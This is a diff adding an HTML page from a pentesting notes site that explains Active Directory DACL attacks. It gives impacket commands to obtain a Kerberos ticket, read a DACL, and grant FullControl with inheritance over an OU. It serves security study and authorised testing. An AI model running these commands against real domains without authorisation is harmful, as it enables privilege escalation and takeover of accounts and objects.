@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>DACL (Discretionary Access Control List) Attack - readloud.org</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "DACL (Discretionary Access Control List) Attack", url: "#_top", children: [
+              {title: "Add Rights", url: "#add-rights" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="dacl-discretionary-access-control-list-attack">DACL (Discretionary Access Control List) Attack</h1>
+<p>DACL is a list of the trustees that are allowed or denied access to objects in Active Directory.</p>
+<div class="language-text highlight"><pre><span></span><code>- [dacl](https://www.thehacker.recipes/a-d/movement/dacl)
+- [access-control-lists](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists)
+</code></pre></div>
+<h2 id="add-rights">Add Rights</h2>
+<p>We may be able to take a full control of securable objects by getting GenericAll permission on OU (Organizational Unit). </p>
+<h3 id="1-ask-tgt-for-kerberos-authentication">1. Ask TGT for Kerberos Authentication</h3>
+<p>If we want to use Kerberos authentication for attacking DACL, we need to retrieve a TGT for specific user at first. In addition, to avoid authentication error, we need to synchronize the system time with the domain controller using <code>ntpdate</code> or <code>rdate</code>.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>example.local
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># or</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>sudo<span class="w"> </span>rdate<span class="w"> </span>-n<span class="w"> </span>example.local
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>impacket-getTGT<span class="w"> </span>-dc-ip<span class="w"> </span>dc.example.local<span class="w"> </span>example.local/username:password
+</span></code></pre></div>
+<p>The <code>getTGT</code> above dumps a <code>.ccache</code> file which stores TGT.</p>
+<p>After dumping the <code>.ccache</code> file, set it to an environment variable for using the later processing.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>username.ccache
+</span></code></pre></div>
+<h3 id="2-read-dacl">2. Read DACL</h3>
+<p>We can use <code>Impacket</code>'s  <code>dacledit</code> which has not yet been merged as of 2023/10/21.  </p>
+<p>The repository is here: https://github.com/ShutdownRepo/impacket/tree/dacledit</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>dacledit.py<span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-target<span class="w"> </span>TestGroup<span class="w"> </span>-principal<span class="w"> </span>username<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>example.local/username:password
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># -use-ldaps: Use LDAPS instead of LDAP</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="c1"># -k: Use Kerberos authentication</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>dacledit.py<span class="w"> </span>-action<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-target<span class="w"> </span>TestGroup<span class="w"> </span>-principal<span class="w"> </span>username<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>example.local/username:password<span class="w"> </span>-use-ldaps<span class="w"> </span>-k
+</span></code></pre></div>
+<h3 id="3-write-dacl">3. Write DACL</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>dacledit.py<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span>-rights<span class="w"> </span><span class="s1">&#39;FullControl&#39;</span><span class="w"> </span>-principal<span class="w"> </span>username<span class="w"> </span>-target-dn<span class="s1">&#39;OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL&#39;</span><span class="w"> </span>-inheritance<span class="w"> </span>-dc-ip<span class="w"> </span>dc.example.local<span class="w"> </span>example.local/username:password<span class="w"> </span>-use-ldaps<span class="w"> </span>-k
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># -use-ldaps: Use LDAPS instead of LDAP</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># -k: Use Kerberos authentication</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>dacledit.py<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span>-rights<span class="w"> </span><span class="s1">&#39;FullControl&#39;</span><span class="w"> </span>-principal<span class="w"> </span>username<span class="w"> </span>-target-dn<span class="s1">&#39;OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL&#39;</span><span class="w"> </span>-inheritance<span class="w"> </span>-dc-ip<span class="w"> </span>dc.example.local<span class="w"> </span>example.local/username:password<span class="w"> </span>-use-ldaps<span class="w"> </span>-k
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/active-directory/dacl-attack.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
